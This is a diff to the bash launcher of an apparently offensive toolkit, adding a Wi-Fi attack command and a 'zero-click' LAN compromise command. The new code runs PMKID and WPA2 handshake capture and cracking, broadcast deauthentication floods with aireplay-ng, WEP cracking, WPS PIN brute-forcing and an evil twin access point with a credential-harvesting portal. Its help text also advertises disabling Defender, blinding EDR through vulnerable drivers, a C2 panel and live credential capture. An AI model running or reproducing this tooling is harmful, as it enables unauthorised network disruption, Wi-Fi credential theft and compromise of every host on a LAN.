@@ -3251,6 +3251,17 @@ cmd_help() {
     echo -e "  ${C}bash start zeroclick${N}     IPv6 Rogue RA + WPAD/NTLMv1 + mDNS + ADIDNS chain"
     echo -e "                          Compromises all LAN hosts with zero victim interaction"
     echo ""
+    echo -e "  ${Y}━━━ WIFI ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}bash start wifi${N}          Interactive WiFi attack menu"
+    echo -e "  ${C}bash start wifi auto${N}     Auto: scan, pick, PMKID/handshake, crack"
+    echo -e "  ${C}bash start wifi scan${N}     Passive scan — list all visible APs"
+    echo -e "  ${C}bash start wifi pmkid${N}    PMKID attack (no client needed)"
+    echo -e "  ${C}bash start wifi handshake${N} Deauth + capture + crack WPA2"
+    echo -e "  ${C}bash start wifi deauth${N}   Deauth flood (kick all clients)"
+    echo -e "  ${C}bash start wifi evil_twin${N} Rogue AP + captive portal"
+    echo -e "  ${C}bash start wifi wps${N}      WPS PIN brute-force (reaver)"
+    echo -e "  ${C}bash start wifi wep${N}      WEP crack (IV injection)"
+    echo ""
 
     echo -e "  ${Y}━━━ C2 PANEL ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}c2 start${N}                Start C2 server in background"
@@ -3869,6 +3880,9 @@ cmd_help2() {
     echo -e "  ${W}Kill Defender:${N}       start kernel defender  →  6 layers, fully patched OK"
     echo -e "  ${W}BYOVD callbacks:${N}     start kernel byovd  →  EDR deaf (any patched Win)"
     echo -e "  ${W}Zero-click chain:${N}    start zeroclick  →  full LAN compromise, no victim action"
+    echo -e "  ${W}WiFi auto-crack:${N}     start wifi auto  →  scan, pick, PMKID/handshake, crack"
+    echo -e "  ${W}WiFi evil twin:${N}      start wifi evil_twin  →  rogue AP + credential portal"
+    echo -e "  ${W}WiFi deauth:${N}         start wifi deauth <iface> <bssid>"
     echo -e "  ${W}Watch creds live:${N}    start creds"
     echo -e "  ${W}Kill everything:${N}     start down"
     echo ""
@@ -6878,6 +6892,183 @@ cmd_netmap() {
     fi
 }
 
+# ══════════════════════════════════════════════════════════════════════════════
+# WiFi Attack
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_wifi() {
+    local ACTION="${1:-menu}"
+    local IFACE="${2:-}"
+    local BSSID="${3:-}"
+    local EXTRA="${4:-}"
+
+    # Detect wireless interface if not provided
+    if [ -z "$IFACE" ]; then
+        IFACE=$(iwconfig 2>/dev/null | grep 'IEEE' | awk '{print $1}' | head -1)
+        [ -z "$IFACE" ] && IFACE="wlan0"
+    fi
+
+    local MOD="$DIR/op/modules/wifi_attack.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |              WiZZA -- WiFi Attack Module                  |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${Y}Detected interface: ${C}$IFACE${N}"
+            echo ""
+            echo -e "  ${W}[1]${N} Auto-attack      (scan, pick network, PMKID/handshake, crack)"
+            echo -e "  ${W}[2]${N} Scan networks     (passive scan, list all APs)"
+            echo -e "  ${W}[3]${N} PMKID attack      (no client needed, modern WPA2)"
+            echo -e "  ${W}[4]${N} Handshake capture (deauth + capture + crack)"
+            echo -e "  ${W}[5]${N} Deauth flood      (kick all clients from AP)"
+            echo -e "  ${W}[6]${N} WEP crack         (IV collection + aircrack-ng)"
+            echo -e "  ${W}[7]${N} WPS brute-force   (reaver PIN attack)"
+            echo -e "  ${W}[8]${N} Evil twin AP      (rogue AP + captive portal)"
+            echo -e "  ${W}[9]${N} Crack .cap file   (existing handshake + wordlist)"
+            echo ""
+            read -rp "  Select [1-9]: " sel
+            case "$sel" in
+                1) cmd_wifi auto "$IFACE" ;;
+                2) cmd_wifi scan "$IFACE" ;;
+                3) cmd_wifi pmkid "$IFACE" ;;
+                4) cmd_wifi handshake "$IFACE" ;;
+                5) cmd_wifi deauth "$IFACE" ;;
+                6) cmd_wifi wep "$IFACE" ;;
+                7) cmd_wifi wps "$IFACE" ;;
+                8) cmd_wifi evil_twin "$IFACE" ;;
+                9) cmd_wifi crack "$IFACE" ;;
+            esac
+            ;;
+
+        auto)
+            check_root
+            echo -e "${Y}[*] WiFi Auto-Attack on $IFACE${N}"
+            sudo python3 "$MOD" auto -i "$IFACE" \
+                --wordlist "${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
+            ;;
+
+        scan)
+            check_root
+            echo -e "${Y}[*] Scanning for WiFi networks on $IFACE...${N}"
+            sudo python3 "$MOD" scan -i "$IFACE" -d "${EXTRA:-15}"
+            ;;
+
+        pmkid)
+            check_root
+            read -rp "  BSSID to target (blank = all): " BSSID
+            read -rp "  Wordlist [/usr/share/wordlists/rockyou.txt]: " WL
+            WL="${WL:-/usr/share/wordlists/rockyou.txt}"
+            echo -e "${Y}[*] PMKID attack on $IFACE${N}"
+            sudo python3 "$MOD" pmkid -i "$IFACE" \
+                ${BSSID:+-b "$BSSID"} -w "$WL" -d 60
+            ;;
+
+        handshake)
+            check_root
+            read -rp "  Target BSSID (AA:BB:CC:DD:EE:FF): " BSSID
+            read -rp "  Channel: " CH
+            read -rp "  SSID name: " ESSID
+            read -rp "  Wordlist [/usr/share/wordlists/rockyou.txt]: " WL
+            WL="${WL:-/usr/share/wordlists/rockyou.txt}"
+            echo -e "${Y}[*] Capturing handshake from $BSSID ch$CH${N}"
+            sudo python3 "$MOD" handshake -i "$IFACE" -b "$BSSID" \
+                -c "$CH" -e "${ESSID:-target}" -w "$WL" -o /tmp
+            ;;
+
+        deauth)
+            check_root
+            [ -z "$BSSID" ] && read -rp "  Target BSSID: " BSSID
+            read -rp "  Client MAC (blank = broadcast all): " CLIENT
+            echo -e "${Y}[*] Deauth flood → $BSSID${N}"
+            if [ -n "$CLIENT" ]; then
+                sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$CLIENT" "$IFACE"
+            else
+                sudo aireplay-ng --deauth 0 -a "$BSSID" "$IFACE"
+            fi
+            ;;
+
+        wep)
+            check_root
+            read -rp "  Target BSSID: " BSSID
+            read -rp "  Channel: " CH
+            echo -e "${Y}[*] WEP attack on $BSSID ch$CH${N}"
+            sudo python3 "$MOD" wep -i "$IFACE" -b "$BSSID" -c "$CH" -o /tmp
+            ;;
+
+        wps)
+            check_root
+            read -rp "  Target BSSID: " BSSID
+            read -rp "  Channel: " CH
+            echo -e "${Y}[*] WPS PIN brute-force on $BSSID${N}"
+            sudo python3 "$MOD" wps -i "$IFACE" -b "$BSSID" -c "$CH" -o /tmp
+            ;;
+
+        evil_twin|eviltwin)
+            check_root
+            read -rp "  Clone SSID: " ESSID
+            read -rp "  Channel [6]: " CH; CH="${CH:-6}"
+            read -rp "  AP interface [$IFACE]: " API; API="${API:-$IFACE}"
+            read -rp "  Monitor interface for deauth (blank = none): " MONI
+            echo -e "${Y}[*] Evil twin AP: '$ESSID' ch$CH on $API${N}"
+            if [ -n "$MONI" ]; then
+                sudo python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_attack import evil_twin
+evil_twin('$API','$MONI','$ESSID',$CH)
+"
+            else
+                sudo python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_attack import evil_twin
+evil_twin('$API',None,'$ESSID',$CH)
+"
+            fi
+            ;;
+
+        crack)
+            read -rp "  Path to .cap file: " CAP
+            read -rp "  BSSID (blank = auto): " BSSID
+            read -rp "  Wordlist [/usr/share/wordlists/rockyou.txt]: " WL
+            WL="${WL:-/usr/share/wordlists/rockyou.txt}"
+            echo -e "${Y}[*] Cracking $CAP${N}"
+            python3 "$MOD" crack -f "$CAP" ${BSSID:+-b "$BSSID"} -w "$WL"
+            ;;
+
+        *)
+            echo "Usage: start wifi [auto|scan|pmkid|handshake|deauth|wep|wps|evil_twin|crack] [iface] [bssid]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Zero-Click Chain
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_zeroclick() {
+    local ACTION="${1:-all}"
+    local IP="${2:-}"
+    local IFACE="${3:-}"
+
+    check_root
+
+    if [ -z "$IP" ]; then
+        IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
+    fi
+    if [ -z "$IFACE" ]; then
+        IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1);exit}}')
+        [ -z "$IFACE" ] && IFACE="eth0"
+    fi
+
+    echo -e "${Y}[*] Zero-Click chain — attacker: $IP  iface: $IFACE${N}"
+    sudo python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+import zero_click as zc
+zc.run('$ACTION', attacker_ip='$IP', iface='$IFACE')
+"
+}
+
 # ── Entry point — dispatch command or run wizard ─────────────
 CMD="${1:-}"
 # Auto-install shortcuts if not already on PATH (first run on new machine)
@@ -6919,6 +7110,8 @@ case "$CMD" in
     redirector)     init_files; cmd_redirector "$2" "$3" "$4" ;;
     profile)        init_files; cmd_profile "$2" ;;
     netmap)         init_files; cmd_netmap ;;
+    wifi)           init_files; cmd_wifi "$2" "$3" "$4" "$5" ;;
+    zeroclick)      init_files; cmd_zeroclick "$2" "$3" "$4" "$5" ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
